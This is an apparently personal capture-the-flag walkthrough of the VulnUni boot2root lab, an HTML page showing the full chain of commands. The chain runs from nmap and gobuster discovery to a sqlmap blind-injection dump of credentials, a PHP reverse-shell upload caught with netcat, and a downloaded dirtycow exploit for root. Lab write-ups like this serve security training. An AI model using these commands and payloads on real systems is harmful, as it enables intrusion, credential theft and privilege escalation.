@@ -1,0 +1,679 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2023-01-07 Sat 14:50 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>&lrm;</title>
+<meta name="generator" content="Org Mode" />
+<style>
+  #content { max-width: 60em; margin: auto; }
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+    background-color: #f2f2f2;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: auto;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    top: -8px;
+    right: 12px;
+    padding: 3px;
+    color: #555;
+    background-color: #f2f2f299;
+  }
+  pre.src:hover:before { display: inline; margin-top: 14px;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-authinfo::before { content: 'Authinfo'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { }
+</style>
+<link rel="stylesheet" type="text/css" href="org.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<ul class="org-ul">
+<li><a href="index.html">home</a></li>
+</ul>
+<div id="outline-container-orgb081a11" class="outline-2">
+<h2 id="orgb081a11">VulnUni&#xa0;&#xa0;&#xa0;<span class="tag"><span class="boot2root">boot2root</span></span></h2>
+<div class="outline-text-2" id="text-orgb081a11">
+<p>
+Its been a while since I did a boot2root, and I got really bored one weekend so I decided to do one.
+</p>
+</div>
+<div id="outline-container-org4150817" class="outline-3">
+<h3 id="org4150817">Discovery</h3>
+<div class="outline-text-3" id="text-org4150817">
+<p>
+All good things start off with <code>nmap</code>, and in this case I'll just use the defaults.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">nmap -Pn -n 192.168.0.120
+</pre>
+</div>
+
+<pre class="example">
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-18 17:53 BST
+Nmap scan report for 192.168.0.120
+Host is up (0.0077s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
+</pre>
+
+
+<p>
+Only port <code>80</code> reported from a basica scan, for now I'll continue on port <code>80</code>, until I hit any road blocks.
+</p>
+
+<p>
+Content discovery is next on the list, and <code>gobuster</code> is pretty good at that.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">./gobuster dir -u http://192.168.0.120/ -w ~/opt/SecLists/Discovery/Web-Content/common.txt
+</pre>
+</div>
+
+<pre class="example" id="orgd0bd070">
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.120/
+[+] Threads:        10
+[+] Wordlist:       ~/opt/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/05/18 17:55:05 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/.hta (Status: 403)
+/about (Status: 200)
+/blog (Status: 200)
+/cgi-bin/ (Status: 403)
+/contact (Status: 200)
+/courses (Status: 200)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index (Status: 200)
+/index.html (Status: 200)
+/js (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/05/18 17:55:09 Finished
+===============================================================
+</pre>
+
+<p>
+Hmm not much to go on, I tried a bunch of other wordlists, but nothing..
+</p>
+
+<p>
+Maybe I'm over complicating things. 
+</p>
+
+<p>
+A bit of looking around later I decided to look at the source for comments, and yeah I've found a comment of interest.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">curl -s http://192.168.0.120/courses.html | grep <span style="font-style: italic;">"&lt;!--"</span>
+</pre>
+</div>
+
+<pre class="example">
+			      &lt;!-- Disabled till new version is installed --&gt;
+			      &lt;!-- &lt;li class="nav-item"&gt;&lt;a href="vulnuni-eclass-platform.html" class="nav-link"&gt;EClass Platform&lt;/a&gt;&lt;/li&gt; --&gt;
+  &lt;!-- END nav --&gt;
+          &lt;p&gt;&lt;!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --&gt;
+&lt;!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --&gt;&lt;/p&gt;
+&lt;!-- loader --&gt;
+</pre>
+
+
+<p>
+The page <code>vulnuni-eclass-platform.html</code> did not come up in the directory brute force, so lets browse to that.
+</p>
+
+<p>
+And sure enough, there is what looks to be an admin portal.
+</p>
+
+
+<div id="orgd674b81" class="figure">
+<p><img src="./vulnuni/vulnuni-eclass.png" alt="vulnuni-eclass.png" />
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org1b4f0aa" class="outline-3">
+<h3 id="org1b4f0aa">Exploitation</h3>
+<div class="outline-text-3" id="text-org1b4f0aa">
+<p>
+Looking for exploits for the Admin portal (eClass) with <code>getsploit</code>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">./getsploit eClass
+</pre>
+</div>
+
+<pre class="example" id="org87b5c74">
+Total found exploits: 8
+Web-search URL: https://vulners.com/search?query=bulletinFamily%3Aexploit+AND+eClass
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+|          ID          |         Exploit Title          |                                                URL                                                 |
++======================+================================+====================================================================================================+
+| BABBBSNW6R3JOXCPVRHB | WAFs don't work                | https://vulners.com/advertisement/BABBBSNW6R3JOXCPVRHB5HWHMRDWJ4QW809F9V8OS5Q6BVKSZ1C77FRPA125R2NS |
+| 5HWHMRDWJ4QW809F9V8O |                                |                                                                                                    |
+| S5Q6BVKSZ1C77FRPA125 |                                |                                                                                                    |
+|         R2NS         |                                |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+|   1337DAY-ID-34046   | GUnet OpenEclass 1.7.3         |                              https://vulners.com/zdt/1337DAY-ID-34046                              |
+|                      | E-learning platform - (month)  |                                                                                                    |
+|                      | SQL Injection Vulnerability    |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+| EXPLOITPACK:1041FF25 | GUnet OpenEclass 1.7.3         |            https://vulners.com/exploitpack/EXPLOITPACK:1041FF2504B12FD3B42DAC15838CE996            |
+| 04B12FD3B42DAC15838C | E-learning platform - month    |                                                                                                    |
+|         E996         | SQL Injection                  |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+|  PACKETSTORM:156601  | GUnet OpenEclass 1.7.3 SQL     |                         https://vulners.com/packetstorm/PACKETSTORM:156601                         |
+|                      | Injection                      |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+|     EDB-ID:48163     | GUnet OpenEclass 1.7.3         |                             https://vulners.com/exploitdb/EDB-ID:48163                             |
+|                      | E-learning platform -          |                                                                                                    |
+|                      | &amp;#039;month&amp;#039; SQL          |                                                                                                    |
+|                      | Injection                      |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+| EXPLOITPACK:D446B164 | GUnet OpenEclass E-learning    |            https://vulners.com/exploitpack/EXPLOITPACK:D446B164277D1EC17F7D9AE0665B19D2            |
+| 277D1EC17F7D9AE0665B | platform 1.7.3 - uname SQL     |                                                                                                    |
+|         19D2         | Injection                      |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+|     EDB-ID:48106     | GUnet OpenEclass E-learning    |                             https://vulners.com/exploitdb/EDB-ID:48106                             |
+|                      | platform 1.7.3 -               |                                                                                                    |
+|                      | &amp;#039;uname&amp;#039; SQL          |                                                                                                    |
+|                      | Injection                      |                                                                                                    |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+|       SSV:3077       | Gentoo ssl-cert eclass |                                https://vulners.com/seebug/SSV:3077                                 |
++----------------------+--------------------------------+----------------------------------------------------------------------------------------------------+
+</pre>
+
+<p>
+Lets try SQL injection on the login pages <code>uname</code> parameter then.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">./sqlmap.py -u http://192.168.0.120/vulnuni-eclass/ --data <span style="font-style: italic;">"uname=test&amp;pass=test&amp;submit=Enter"</span> -p uname
+</pre>
+</div>
+
+<pre class="example" id="org041d399">
+	___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.5.24#dev}
+|_ -| . [']     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:13:45 /2020-05-18/
+
+[18:13:45] [INFO] resuming back-end DBMS 'mysql' 
+[18:13:45] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=8v517iblhcp...6du7esuin7'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=test' AND (SELECT 9462 FROM (SELECT(SLEEP(5)))fxbY) AND 'PLXO'='PLXO&amp;pass=test&amp;submit=Enter
+---
+[18:13:45] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+web application technology: Apache 2.2.22, PHP 5.3.10, PHP
+back-end DBMS: MySQL &gt;= 5.0.12
+
+[*] ending @ 18:13:45 /2020-05-18/
+
+</pre>
+
+<p>
+Yep, looks like we have injection. Using <code>sqlmap</code> more I've found out that the current database is <code>eclass</code>.
+</p>
+
+<pre class="example" id="org8bc9c7d">
+[18:16:51] [INFO] fetching current database
+[18:16:51] [INFO] resumed: eclass
+current database: 'eclass'
+</pre>
+
+<p>
+Looking around that database for a bit I found a column for username &amp; passwords.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">./sqlmap.py -u http://192.168.0.120/vulnuni-eclass/ --data <span style="font-style: italic;">"uname=test&amp;pass=test&amp;submit=Enter"</span> -p uname -D eclass -T user --dump --batch
+</pre>
+</div>
+
+<pre class="example" id="orgf92feeb">
+	___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.5.24#dev}
+|_ -| . [']     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:40:35 /2020-05-25/
+
+[11:40:35] [INFO] resuming back-end DBMS 'mysql' 
+[11:40:35] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=n08sq64vm1r...7srvt7s0o4'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=test' AND (SELECT 9462 FROM (SELECT(SLEEP(5)))fxbY) AND 'PLXO'='PLXO&amp;pass=test&amp;submit=Enter
+---
+[11:40:35] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+web application technology: Apache 2.2.22, PHP 5.3.10, PHP
+back-end DBMS: MySQL &gt;= 5.0.12
+[11:40:35] [INFO] fetching columns for table 'user' in database 'eclass'
+[11:40:35] [INFO] resumed: 11
+[11:40:35] [INFO] resumed: user_id
+[11:40:35] [INFO] resumed: nom
+[11:40:35] [INFO] resumed: prenom
+[11:40:35] [INFO] resumed: username
+[11:40:35] [INFO] resumed: password
+[11:40:35] [INFO] resumed: email
+[11:40:35] [INFO] resumed: statut
+[11:40:35] [INFO] resumed: phone
+[11:40:35] [INFO] resumed: department
+[11:40:35] [INFO] resumed: inst_id
+[11:40:35] [INFO] resumed: am
+[11:40:35] [INFO] fetching entries for table 'user' in database 'eclass'
+[11:40:35] [INFO] fetching number of entries for table 'user' in database 'eclass'
+[11:40:35] [INFO] resumed: 4
+[11:40:35] [INFO] resumed: smith.j.1971
+[11:40:35] [INFO] resumed:  
+[11:40:35] [INFO] resumed: 4
+[11:40:35] [INFO] resumed: smith.j@gmail.com
+[11:40:35] [INFO] resumed:  
+[11:40:35] [INFO] resumed: Smith
+[11:40:35] [INFO] resumed:  
+[11:40:35] [INFO] resumed: John
+[11:40:35] [INFO] resumed: 1
+[11:40:35] [INFO] resumed: 2
+[11:40:35] [INFO] resumed: smith.j
+[11:40:35] [INFO] resumed: ilikecats89
+
+[11:40:35] [INFO] retrieved: [11:40:35] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+[11:40:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[11:40:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: adminvulnuni@gmail.com
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: admin
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: admin
+[11:40:36] [INFO] resumed: 1
+[11:40:36] [INFO] resumed: 1
+[11:40:36] [INFO] resumed: admin
+[11:40:36] [INFO] resumed: hf74nd9dmw
+[11:40:36] [INFO] resumed: 1758694758
+[11:40:36] [INFO] resumed: 4
+[11:40:36] [INFO] resumed: garris.e@gmail.com
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: Garris
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: Erick
+[11:40:36] [INFO] resumed: 5
+[11:40:36] [INFO] resumed: 3
+[11:40:36] [INFO] resumed: garris.e
+[11:40:36] [INFO] resumed: i74nw02nm3
+[11:40:36] [INFO] resumed: 5684758210
+[11:40:36] [INFO] resumed: 4
+[11:40:36] [INFO] resumed: perez.s@gmail.com
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: Perez
+[11:40:36] [INFO] resumed:  
+[11:40:36] [INFO] resumed: Stephanie
+[11:40:36] [INFO] resumed: 5
+[11:40:36] [INFO] resumed: 4
+[11:40:36] [INFO] resumed: perez.s
+Database: eclass
+Table: user
+[4 entries]
++---------+---------+------------+--------+-------+------------------------+-----------+--------+----------+--------------+------------+
+| user_id | inst_id | am         | nom    | phone | email                  | prenom    | statut | username | password     | department |
++---------+---------+------------+--------+-------+------------------------+-----------+--------+----------+--------------+------------+
+| 2       | NULL    | NULL       | Smith  | NULL  | smith.j@gmail.com      | John      | 1      | smith.j  | smith.j.1971 | 4          |
+| 1       | NULL    | &lt;blank&gt;    | admin  | NULL  | adminvulnuni@gmail.com | admin     | 1      | admin    | ilikecats89  | NULL       |
+| 3       | NULL    | 1758694758 | Garris | NULL  | garris.e@gmail.com     | Erick     | 5      | garris.e | hf74nd9dmw   | 4          |
+| 4       | NULL    | 5684758210 | Perez  | NULL  | perez.s@gmail.com      | Stephanie | 5      | perez.s  | i74nw02nm3   | 4          |
++---------+---------+------------+--------+-------+------------------------+-----------+--------+----------+--------------+------------+
+
+[*] ending @ 11:40:36 /2020-05-25/
+
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org5db5776" class="outline-3">
+<h3 id="org5db5776">Exploitation</h3>
+<div class="outline-text-3" id="text-org5db5776">
+<p>
+Logging into the application with the admin creds above I get admin access to the application.
+</p>
+
+<p>
+Reviewing the admin functionality there is the ability to upload a <code>.zip</code> file in the "Restore a course" functionality.
+</p>
+
+
+<div id="orgab9cf57" class="figure">
+<p><img src="./vulnuni/rescourse.png" alt="rescourse.png" />
+</p>
+</div>
+
+<p>
+I'll upload a <code>php</code> reverse shell.
+</p>
+
+<p>
+First I need to download it.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php 
+</pre>
+</div>
+
+<p>
+And then use this nice one liner to change the IP address in the file.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">sed -i s/<span style="font-style: italic;">"$ip = '127.0.0.1';"</span>/<span style="font-style: italic;">"$ip = '$(ip addr show wlp3s0 | grep inet | cut -d ' ' -f 6 | cut -d '/' -f 1)';"</span>/g ./php-reverse-shell.php
+</pre>
+</div>
+
+<p>
+Then make the zip and upload.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">zip payload.zip ./php-reverse-shell.php 
+</pre>
+</div>
+
+<pre class="example">
+updating: php-reverse-shell.php (deflated 59%)
+</pre>
+
+
+<p>
+Finally setup a listener for the shell to come back on.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">nc -nlvp 1234
+</pre>
+</div>
+
+<p>
+The next step is to call the file I uploaded, during discovery I did notice directory listing at <code>/vulnuni-eclass/courses/</code> 
+Looking back there in the tmp folder I see the uploaded reverse shell. and if I call that with <code>curl</code> I get a shell on my listener.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">curl -s http://www.vulnuni.local/vulnuni-eclass/courses/tmpUnzipping/php-reverse-shell.php
+</pre>
+</div>
+
+
+<div id="org9e19571" class="figure">
+<p><img src="./vulnuni/shell.png" alt="shell.png" />
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org394fa88" class="outline-3">
+<h3 id="org394fa88">Post Exploitation</h3>
+<div class="outline-text-3" id="text-org394fa88">
+<p>
+First things first is that I need an interactive shell. I'll do that with the following command.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">/bin/bash -i
+</pre>
+</div>
+
+<p>
+Its not perfect, and I know there are much better ways to have a "full" shell, but it'll do for me.
+</p>
+
+<p>
+The first flag is in the home directory..
+</p>
+
+
+<div id="org1217b91" class="figure">
+<p><img src="./vulnuni/first_flag.png" alt="first_flag.png" />
+</p>
+</div>
+
+<p>
+Remember the output when I got the shell, it included the kernel version, searching for an exploit, I discovered that it may be vulnerable to dirtycow. 
+</p>
+
+<p>
+I decided to download it to the box, and compile it.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell"><span style="font-weight: bold;">cd</span> /tmp &amp;&amp; wget https://gist.githubusercontent.com/scumjr/17d91f20f73157c722ba2aea702985d2/raw/a37178567ca7b816a5c6f891080770feca5c74d7/dirtycow-mem.c
+</pre>
+</div>
+
+<p>
+The exploit has a comment on how to compile it. and it seemed like it worked on the box. Now to run it.
+</p>
+
+
+<div id="orgce68ca7" class="figure">
+<p><img src="./vulnuni/root.png" alt="root.png" />
+</p>
+</div>
+
+<p>
+Yep, got root.
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
